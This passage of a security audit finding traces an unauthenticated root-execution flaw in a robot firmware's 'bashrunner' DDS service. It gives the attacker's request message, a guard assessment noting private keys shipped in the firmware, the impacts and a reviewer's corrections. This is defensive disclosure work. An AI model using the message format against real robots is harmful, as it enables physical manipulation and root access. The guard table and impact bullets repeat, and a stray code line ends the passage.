3. Attacker publishes `Request_(header=RequestHeader_(identity=RequestIdentity_(id=<any int64>, api_id=<any int64>), lease=RequestLease_(0), policy=RequestPolicy_(1, True)), parameter='{"script": "demarcate_partmotorcali.sh <arg1> <arg2> ..."}', binary=[0])`.
   Application: main() takes up to 20 samples per loop (bashrunner.py:199) and submits each to thread_task (bashrunner.py:205).
4. thread_task reads api_id/identity_id (bashrunner.py:87-88) — **no validation is performed on either**; lease and policy are never read at all.
5. thread_task parses the JSON and splits on whitespace: `args = json_parameter['script'].split()` (bashrunner.py:90-91) — each arg is one whitespace-free token.
6. Whitelist check `args[0] in command_execution_list` (bashrunner.py:98) — membership in the os.listdir() snapshot (bashrunner.py:45-46). Exact basename equality; path traversal via args[0] is impossible (any "/" breaks equality with a basename).
7. args[0] is replaced with the absolute script path and the list is executed: `subprocess.run(["sh", "/unitree/module/bashrunner/command_execution/<script>", *args[1:]])` (bashrunner.py:97-106) — **as root**, no shell=True (so no shell metachar interpretation at this layer), **no validation of args[1:] whatsoever**, no timeout.
8. The script's stdout is decoded and published back on `rt/api/bashrunner/response` (bashrunner.py:107-128) — readable by the attacker and forwarded by webrtc_bridge to the remote WebRTC peer (webrtc_bridge.LOG:5423).

(attacker-controlled argv into root-executed scripts)
```

### Guard Assessment
| # | Guard | Location | What It Checks | Effective? | Why/Why Not |
|---|-------|----------|---------------|------------|-------------|
| 1 | DDS-Security Authentication | etc/cyclonedds.xml | peer identity (CA-signed cert) | NO for attacker model | CA + device cert + private key shipped in firmware (etc/ds/); any image holder is a valid participant; no AccessControl plugin constrains topics |
| 2 | Reader QoS | bashrunner.py:29-34 | Reliable + Deadline(1ms) + TransientLocal writer | WEAK | only a compatibility filter; the matching QoS is shipped in mock_sender.py:20-25 |
| 3 | `args[0] in command_execution_list` / `content_acquisition_list` | bashrunner.py:98, 129 | exact basename membership | YES for name; NO for anything else | prevents running non-whitelisted files and path traversal (basenames contain no '/'), but does not constrain args[1:] |
| 4 | api_id / identity_id validation | bashrunner.py:87-88 | NOTHING — values only printed/echoed | NO | no comparison, no allowlist; lease/policy fields never read |
| 5 | argument sanitization for args[1:] | ABSENT | — | NO | no code touches args[1:] before exec |

### Impact
- **Root execution primitive**: attacker chooses any of the 15 command_execution / 7 content_acquisition scripts and supplies an arbitrary argument vector (each token whitespace-free). On its own this already yields unauthenticated physical robot manipulation (see AUD-bashrunner-robot-state) and root process execution (`sh` + script + attacker argv, cwd = service cwd).
- **Direct root RCE escalation paths** (exact attacker control documented for the binary-analysis agent, LB-3):
  - `motortools.sh` forwards args 1-7 as **bare positionals** to a root calibration binary with unquoted (glob-active) expansion — see AUD-bashrunner-motortools-arginj.
  - 5 scripts forward `$1` into root binaries `basic_demarcate` / `basic_motorcali` (both present, not stripped) after required-arg flags; basic_demarcate has undocumented options `--cmd1..4`, `--auxiliarycalibration`, `--estoppower` (strings evidence) — if any option reads/executes attacker-named files, this becomes file-read/RCE.
- **Output disclosure**: script stdout returns to the attacker over DDS (and to whatever remote peer holds the WebRTC data channel).
- **Unbounded, untimed execution**: no rate limit, no timeout — long-running calibration commands pin worker threads (feeds AUD-bashrunner-threadpool-crash).
- Limitations: args[0] cannot escape the two whitelist directories; direct shell command injection (metacharacters) is not possible at this layer (verified empirically — tokens are literal argv values; Python's split() removes all whitespace so no word-splitting).

### Origin
- **Group**: mod-005
- **Files**: module/bashrunner/bashrunner.py; module/bashrunner/mock_sender.py; etc/cyclonedds.xml; etc/ds/*; etc/master_service/service/bashrunner
- **Sink catalog reference**: audit/sinks/mod-005-bashrunner.md — Seed Sinks rows 1-3; Sink Assessment Summary rows 1-2

### Confidence
9 — code path fully read and cited; reachability premise (shipped DDS keys) verified in image; QoS requirement derived from reader QoS and cross-checked against the shipped working client; the only UNVERIFIED element is whether the webrtc_bridge signaling path is itself open (binary-side, noted in profile).

## Review: PASSED
- Taint trace verified: yes — full re-read of bashrunner.py (all 213 lines). `sample.header.lease`/`sample.header.policy` are NEVER dereferenced (grep: only QoS `Policy.*` constructor lines and comments); `api_id` is read (bashrunner.py:87), printed (:93), echoed (:125/150/158/186) and compared to nothing. args[1:] flows unmodified from `json.loads().split()` (bashrunner.py:90-91) to `subprocess.run` (bashrunner.py:102-106).
- Constraints verified: yes — whitelist is basename-exact listdir membership (bashrunner.py:46/49/98/129; traversal structurally impossible). Reader QoS (bashrunner.py:29-34, Reliable+Deadline(1000µs)+TransientLocal+KeepLast(10)) is a real compatibility gate, and the matching recipe ships at mock_sender.py:20-25 (writer :27/:30). Reachability premises independently confirmed: `etc/ds/pVKdbS1fQJ9a.crt` begins `<私钥_01>` (device private key in firmware); `etc/cyclonedds.xml` configures ONLY the Authentication plugin (no AccessControl/Crypto); `etc/master_service/service/bashrunner` Start Cmd has no privilege drop; webrtc_bridge.LOG:5394 (writer) / :5423 (response reader) / :1022 (production app data-channel request) re-counted and exact.
- Severity confirmed: CRITICAL.
- **Correction (citation + Impact):** (1) the wire fields are declared at `_RequestHeader_.py:24-27`, not `:30-33` (the file is 29 lines). (2) The two "Direct root RCE escalation paths" in Impact are REFUTED by the LB-3 binary analysis (E2-rce.md / E20-mem.md), re-verified here: `nm -D` shows neither `robot/tool/basic_demarcate` (44 imports) nor `robot/tool/basic_motorcali` imports system/exec/popen/fork/posix_spawn/dlopen; argv[1] is script-fixed in all 14 live scripts (attacker reaches a value slot only); `basic_demarcate` argc>3 → exit(-11) kills glob word-multiplication; `motortools_linux_arm_pro_cal_G1` and `robot/tool/motor/` are absent from the image (`find` verified). **CRITICAL does not rest on those legs**: it rests on the verified unauthenticated root execution of whitelisted scripts with attacker argv, whose live consequences are the physical/safety primitives (AUD-bashrunner-robot-state, AUD-demarcate-estop-rebind) and root RCE via the world-writable whitelist (AUD-bashrunner-worldwritable-whitelist).

| # | Guard | Location | What It Checks | Effective? | Why/Why Not |
|---|-------|----------|---------------|------------|-------------|
| 1 | DDS-Security Authentication | etc/cyclonedds.xml | peer identity (CA-signed cert) | NO for attacker model | CA + device cert + private key shipped in firmware (etc/ds/); any image holder is a valid participant; no AccessControl plugin constrains topics |
| 2 | Reader QoS | bashrunner.py:29-34 | Reliable + Deadline(1ms) + TransientLocal writer | WEAK | only a compatibility filter; the matching QoS is shipped in mock_sender.py:20-25 |
| 3 | `args[0] in command_execution_list` / `content_acquisition_list` | bashrunner.py:98, 129 | exact basename membership | YES for name; NO for anything else | prevents running non-whitelisted files and path traversal (basenames contain no '/'), but does not constrain args[1:] |
| 4 | api_id / identity_id validation | bashrunner.py:87-88 | NOTHING — values only printed/echoed | NO | no comparison, no allowlist; lease/policy fields never read |

- **Root execution primitive**: attacker chooses any of the 15 command_execution / 7 content_acquisition scripts and supplies an arbitrary argument vector (each token whitespace-free). On its own this already yields unauthenticated physical robot manipulation (see AUD-bashrunner-robot-state) and root process execution (`sh` + script + attacker argv, cwd = service cwd).
- **Direct root RCE escalation paths** (exact attacker control documented for the binary-analysis agent, LB-3):

from cyclonedds.topic import Topic
